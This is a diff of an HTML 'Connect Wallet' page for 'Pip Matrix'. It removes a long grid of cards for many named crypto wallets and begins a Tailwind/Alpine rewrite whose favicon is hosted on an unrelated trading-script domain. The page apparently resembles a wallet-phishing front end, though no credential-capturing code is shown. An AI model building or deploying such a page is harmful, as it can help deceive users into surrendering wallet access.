@@ -1,1794 +1,436 @@
-
 <!DOCTYPE html>
-<html lang="en">
-
-<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<html lang="en" x-data="walletApp()" :class="{ 'dark': true }" class="dark">
 <head>
-    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
-    <meta charset="utf-8">
-    <title>Connect</title>
-    <meta name="author" content="themesflat.com">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet - Pip Matrix</title>
+    <link href="https://remedyalgotradescript.sbs/storage/app/public/photos/Px9MifdF6k4uRiyRSGBX6qi4kKWtbhpkYNQrAouw.png" rel="icon" type="image/x-icon" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        primary: {
+                            50: '#eef2ff',
+                            100: '#e0e7ff',
+                            200: '#c7d2fe',
+                            300: '#a5b4fc',
+                            400: '#818cf8',
+                            500: '#6366f1',
+                            600: '#4f46e5',
+                            700: '#4338ca',
+                            800: '#3730a3',
+                            900: '#312e81',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
-        .themesflat-container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
-        .tf-section { padding: 60px 0; }
-        .tf-title { font-size: 36px; font-weight: 600; margin-bottom: 20px; text-align: center; }
-        .heading-line { height: 3px; width: 80px; background: #007bff; margin: 20px auto; }
-        .wallets { margin-bottom: 30px; }
-        .sc-author-box { transition: all 0.3s ease; padding: 20px; border-radius: 10px; text-align: center; background: white; }
-        .sc-author-box:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
-        .author-avatar { margin-bottom: 15px; }
-        .avatar { width: 80px; height: 80px; border-radius: 10px; object-fit: cover; }
-        .author-infor h5 { margin: 10px 0; font-weight: 600; }
-        .online-dot { display: inline-block; width: 10px; height: 10px; background: #28a745; border-radius: 50%; margin-left: 5px; }
-        .price { color: #666; font-size: 14px; }
-        .select_wallet { cursor: pointer; }
-        .input-group { margin-bottom: 30px; }
-        .form-control { border-radius: 5px; padding: 12px; }
-        .btn-primary { background: #007bff; border: none; padding: 10px 20px; }
+        [x-cloak] { display: none !important; }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        @keyframes fadeOut {
+            from { opacity: 1; transform: scale(1); }
+            to { opacity: 0; transform: scale(0.95); }
+        }
+        
+        .animate-spin-slow {
+            animation: spin 2s linear infinite;
+        }
+        
+        .animate-pulse-slow {
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        .modal-enter {
+            animation: fadeIn 0.3s ease-out forwards;
+        }
+        
+        .modal-leave {
+            animation: fadeOut 0.2s ease-in forwards;
+        }
+        
+        .wallet-card {
+            transition: all 0.3s ease;
+        }
+        
+        .wallet-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+        
+        .connected-glow {
+            box-shadow: 0 0 20px rgba(34, 197, 94, 0.4);
+        }
     </style>
-
 </head>
 
-<body class="body header-fixed">
-    <div id="wrapper">
-        <div id="page" class="clearfix">
-            <section class="tf-section top-seller" id="wallets_list">
-                <div class="themesflat-container">
-                    <div class="row">
-                        <div class="col-md-12">
-                            <h2 class="tf-title style2">
-                                Select a Wallet</h2>
-                            <div class="heading-line s2"></div>
-                            
-                            <!-- Search Feature -->
-                            <div class="input-group mb-3">
-                                <input type="text" class="form-control search" placeholder="Search...">
-                                <div class="input-group-append">
-                                    <button class="btn btn-primary" type="button">Search</button>
-                                </div>
-                            </div>
-                            
-                        </div>
-                        
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="wallet_connect" class="sc-author-box select_wallet" data-title="ledger"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Ledger</a>
-                                        <span class="online-dot"></span>
-                                    
-                                    </h5>
-                                    
-                                    <span class="price">ledger.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="wallet_connect" class="sc-author-box select_wallet" data-title="Wallet Connect"
-                                data-logo="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Wallet Connect</a><span class="online-dot"></span><span class="price">walletconnect.com</span></h5>
-                                    
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="trust_wallet" class="sc-author-box select_wallet" data-title="Trust Wallet"
-                                data-logo="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Trust Wallet</a><span class="online-dot"></span></h5>
-                                    
-                                    <span class="price">trustwallet.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="metamask" class="sc-author-box select_wallet" data-title="Metamask"
-                                data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/800px-MetaMask_Fox.svg.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/800px-MetaMask_Fox.svg.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Metamask</a><span class="online-dot"></span></h5>
-                                    <span class="price">metamask.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="binance" class="sc-author-box select_wallet" data-title="Binance Chain Wallet"
-                                data-logo="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/BUSD-BAF/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/BUSD-BAF/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Binance Chain Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">binance.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="polygon" class="sc-author-box select_wallet" data-title="Polygon Wallet"
-                                data-logo="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/polygon/assets/0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/polygon/assets/0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Polygon Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">polygon.technology</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="rainbow" class="sc-author-box select_wallet" data-title="Rainbow"
-                                data-logo="https://pbs.twimg.com/profile_images/1445764532/rainbow_150.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://pbs.twimg.com/profile_images/1445764532/rainbow_150.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Rainbow</a><span class="online-dot"></span></h5>
-                                    <span class="price">rainbow.me</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="bitpay" class="sc-author-box select_wallet" data-title="Bitpay"
-                                data-logo="https://bitpay.com/img/wallet-logos/bitpay.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://bitpay.com/img/wallet-logos/bitpay.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Bitpay</a><span class="online-dot"></span></h5>
-                                    <span class="price">bitpay.com</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="bitpay" class="sc-author-box select_wallet" data-title="Xumm"
-                                data-logo="https://xumm.app/assets/img/logo.png"
-                                style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://xumm.app/assets/img/logo.png"
-                                            alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Xumm</a><span class="online-dot"></span></h5>
-                                    <span class="price">xumm.app</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="bitpay" class="sc-author-box select_wallet" data-title="Bitpay"
-                                data-logo="https://play-lh.googleusercontent.com/PD6ommpOAofmpJzNt5t4zDoGsloOi3O3EM8GoS0pGa6O5RAmRMvSD2CdY962LmaVwQ=s200"
-                                style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://play-lh.googleusercontent.com/PD6ommpOAofmpJzNt5t4zDoGsloOi3O3EM8GoS0pGa6O5RAmRMvSD2CdY962LmaVwQ=s200"
-                                            alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Saita Pro</a><span class="online-dot"></span></h5>
-                                    <span class="price">saitapro.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="waleth" class="sc-author-box select_wallet" data-title="Walleth"
-                                data-logo="https://raw.githubusercontent.com/walleth/walleth/master/images/icon.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://raw.githubusercontent.com/walleth/walleth/master/images/icon.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Walleth</a><span class="online-dot"></span></h5>
-                                    <span class="price">walleth.org</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="SaitaMask" class="sc-author-box select_wallet" data-title="SaitaMask"
-                                data-logo="https://play-lh.googleusercontent.com/HmXjCZa048la55QfEg_6CJo8Qt7NN0HVUR2cu8uk5gm5BoNhEXulPrgT0Qbnoaf3tHfl"
-                                style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://play-lh.googleusercontent.com/HmXjCZa048la55QfEg_6CJo8Qt7NN0HVUR2cu8uk5gm5BoNhEXulPrgT0Qbnoaf3tHfl"
-                                            alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>SaitaMask </a><span class="online-dot"></span></h5>
-                                    <span class="price">SaitaMask.org</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="argent" class="sc-author-box select_wallet" data-title="Argent"
-                                data-logo="https://pbs.twimg.com/profile_images/1445621895/argent_logo_square_400x400.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://pbs.twimg.com/profile_images/1445621895/argent_logo_square_400x400.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Argent</a><span class="online-dot"></span></h5>
-                                    <span class="price">argent.xyz</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="huobi" class="sc-author-box select_wallet" data-title="Huobi Wallet"
-                                data-logo="https://www.huobiwallet.com/favicon.ico" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.huobiwallet.com/favicon.ico" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Huobi Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">huobiwallet.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="encrypted_ink" class="sc-author-box select_wallet" data-title="Encrypted Ink"
-                                data-logo="https://encrypted.ink/assets/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://encrypted.ink/assets/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Encrypted Ink</a><span class="online-dot"></span></h5>
-                                    <span class="price">encrypted.ink</span>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="keplr" class="sc-author-box select_wallet" data-title="KEPLR"
-                                data-logo="https://play-lh.googleusercontent.com/YM7h-nnxtDs9WROvE0GUzreNFua0eIm2N2m181BuiLgAqOeByqYZahsnbKos2xSGdAmv=w240-h480-rw"
-                                style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://play-lh.googleusercontent.com/YM7h-nnxtDs9WROvE0GUzreNFua0eIm2N2m181BuiLgAqOeByqYZahsnbKos2xSGdAmv=w240-h480-rw"
-                                            alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>KEPLR</a><span class="online-dot"></span></h5>
-                                    <span class="price">KEPLR</span>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="keplr" class="sc-author-box select_wallet" data-title="Plug Wallet"
-                                data-logo="https://plug.oo/img/plug-logo.png"
-                                style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://plug.oo/img/plug-logo.png"
-                                            alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Plug Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">plug.oo</span>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="keplr" class="sc-author-box select_wallet" data-title="Phantom"
-                                data-logo="https://phantom.app/img/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://phantom.app/img/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Phantom</a><span class="online-dot"></span></h5>
-                                    <span class="price">Phantom</span>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="compound" class="sc-author-box select_wallet" data-title="Compound"
-                                data-logo="https://compound.finance/images/compound-mark.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://compound.finance/images/compound-mark.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Compound</a><span class="online-dot"></span></h5>
-                                    <span class="price">compound.finance</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="polkadot" class="sc-author-box select_wallet" data-title="Polkadot"
-                                data-logo="https://wiki.polkadot.network/img/polkadot-logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://wiki.polkadot.network/img/polkadot-logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Polkadot</a><span class="online-dot"></span></h5>
-                                    <span class="price">polkadot.network</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="iotex" class="sc-author-box select_wallet" data-title="Iotex"
-                                data-logo="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/iotex/logo.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/iotex/logo.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Iotex</a><span class="online-dot"></span></h5>
-                                    <span class="price">iotex.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="coin98" class="sc-author-box select_wallet" data-title="Coin98"
-                                data-logo="https://coin98.com/assets/img/logo-coin98.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://coin98.com/assets/img/logo-coin98.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Coin98</a><span class="online-dot"></span></h5>
-                                    <span class="price">coin98.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="coinbase" class="sc-author-box select_wallet" data-title="Coinbase"
-                                data-logo="https://www.coinbase.com/apple-touch-icon.png" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.coinbase.com/apple-touch-icon.png" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Coinbase</a><span class="online-dot"></span></h5>
-                                    <span class="price">coinbase.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="crypto" class="sc-author-box select_wallet" data-title="Crypto.com | Defi Wallet"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Crypto.com | Defi Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">crypto.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="token_pocket" class="sc-author-box select_wallet" data-title="Token Pocket"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Token Pocket</a><span class="online-dot"></span></h5>
-                                    <span class="price">tokenpocket.pro</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="math_wallet" class="sc-author-box select_wallet" data-title="Math Wallet"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Math Wallet</a><span class="online-dot"></span></h5>
-                                    <span class="price">mathwallet.org</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="ledger_live" class="sc-author-box select_wallet" data-title="Ledger Live"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Ledger Live</a><span class="online-dot"></span></h5>
-                                    <span class="price">ledger.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="_1inch" class="sc-author-box select_wallet" data-title="1Inch"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>1Inch</a><span class="online-dot"></span></h5>
-                                    <span class="price">1inch.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="dharma" class="sc-author-box select_wallet" data-title="Dharma"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Dharma</a><span class="online-dot"></span></h5>
-                                    <span class="price">dharma.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="trust_vault" class="sc-author-box select_wallet" data-title="Trust Vault"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Trust Vault</a><span class="online-dot"></span></h5>
-                                    <span class="price">trustology.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="my_key" class="sc-author-box select_wallet" data-title="MYKEY"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>MYKEY</a><span class="online-dot"></span></h5>
-                                    <span class="price">mykey.org</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="atomic" class="sc-author-box select_wallet" data-title="Atomic"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Atomic</a><span class="online-dot"></span></h5>
-                                    <span class="price">atomicwallet.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="cool_wallet_s" class="sc-author-box select_wallet" data-title="CoolWallet S"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>CoolWallet S</a><span class="online-dot"></span></h5>
-                                    <span class="price">coolwallet.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="nash" class="sc-author-box select_wallet" data-title="Nash"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Nash</a><span class="online-dot"></span></h5>
-                                    <span class="price">nash.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="coinomi" class="sc-author-box select_wallet" data-title="Coinomi"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Coinomi</a><span class="online-dot"></span></h5>
-                                    <span class="price">coinomi.com</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="gridplus" class="sc-author-box select_wallet" data-title="GridPlus"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>GridPlus</a><span class="online-dot"></span></h5>
-                                    <span class="price">gridplus.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="tokenary" class="sc-author-box select_wallet" data-title="Tokenary"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>Tokenary</a><span class="online-dot"></span></h5>
-                                    <span class="price">tokenary.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
-                            <div id="safepal" class="sc-author-box select_wallet" data-title="SafePal"
-                                data-logo="https://www.svgrepo.com/show/373426/wallet.svg" style="cursor:pointer;">
-                                <div class="author-avatar">
-                                    <a href="#">
-                                        <img src="https://www.svgrepo.com/show/373426/wallet.svg" alt="Image" class="avatar">
-                                    </a>
-                                     
-                                </div>
-                                <div class="author-infor">
-                                    <h5 class="style2"><a>SafePal</a><span class="online-dot"></span></h5>
-                                    <span class="price">safepal.io</span>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
